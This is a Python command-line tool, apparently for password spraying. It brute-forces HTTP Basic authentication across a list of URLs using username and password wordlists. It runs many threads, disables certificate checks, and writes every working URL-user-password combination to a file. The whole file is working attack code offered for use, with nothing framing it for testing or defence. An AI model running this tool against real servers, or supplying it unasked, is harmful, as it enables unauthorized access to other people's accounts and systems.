#!/usr/bin/env python3


import sys
import concurrent.futures
from requests import get as GET
from colorama import Fore
from os.path import isfile
from argparse import ArgumentParser
from base64 import b64encode
from urllib.parse import urlparse
from requests.exceptions import ConnectionError
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from requests.packages.urllib3.exceptions import InsecurePlatformWarning
from requests.packages.urllib3.exceptions import SNIMissingWarning


def printer(_:str) -> None:
	sys.stdout.write(f'\n{Fore.BLUE}\n[*] {Fore.WHITE}URL : {Fore.YELLOW}{url}{Fore.WHITE}\n{Fore.BLUE}[*]{Fore.WHITE} trying with {Fore.YELLOW}{_} {Fore.WHITE}')
	sys.stdout.flush()

def encode_user_passwd(user:str, passwd:str) -> str:
	user_pass = f"{user}:{passwd.strip()}"
	base64_value = b64encode(user_pass.encode('utf-8')).decode('utf-8')
	return base64_value

def send_request(url:str, user:str, passwd:str):
	base64_value = encode_user_passwd(user, passwd)
	headers = {"Authorization": f"Basic {base64_value}"}
	try:
		response = GET(url, headers=headers, verify=False, timeout=timeout)
		printer(f"{user}:{passwd}")
		if response.status_code != 401 :
			print(f"\n\n{Fore.GREEN}[+] {Fore.WHITE} PASSWORD FOUND : {Fore.GREEN}{user}:{passwd}{Fore.WHITE}.")
			print(f"{Fore.GREEN}[+] {Fore.WHITE} URL : {Fore.GREEN}{url}{Fore.WHITE}.\n\n")
			with open(output, 'a') as f:
				f.write(f"{url}:{user}:{passwd}\n")
	except Exception as err:
		print(err)

if __name__ == "__main__":
	parser = ArgumentParser()
	parser.add_argument('-url-file', required=True, help="TEXT FILE WITH LIST OF URLS")
	parser.add_argument('-users-file', required=True, help="USERS FILE")
	parser.add_argument('-pass-file', required=True, help="PASSWORDS FILE")
	parser.add_argument('-timeout', required=True, help="REQUEST TIMEOUT")
	parser.add_argument('-threads', required=True, help="THREAD NUMBER")
	parser.add_argument('-out', required=True, help="OUTPUT VALID PASSWORDS")
	parser.add_argument('--sslinsecure', action='store_true', help="DISABLE SSL VERIFICATION")
	args = parser.parse_args()
	urls = open(args.url_file, mode='r').readlines()
	users = open(args.users_file, mode='r').readlines()
	passwords = open(args.pass_file, mode='r').readlines()
	timeout = int(args.timeout)
	threads = int(args.threads)
	output = args.out
	for url in urls:
		url = url.strip('\n\r')
		for user in users:
			user = user.strip('\n\r')
			try:
				with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
					{ executor.submit(send_request, url, user, passwd) for passwd in passwords}
			except KeyboardInterrupt:
				exit('CTRL+C Detected...')
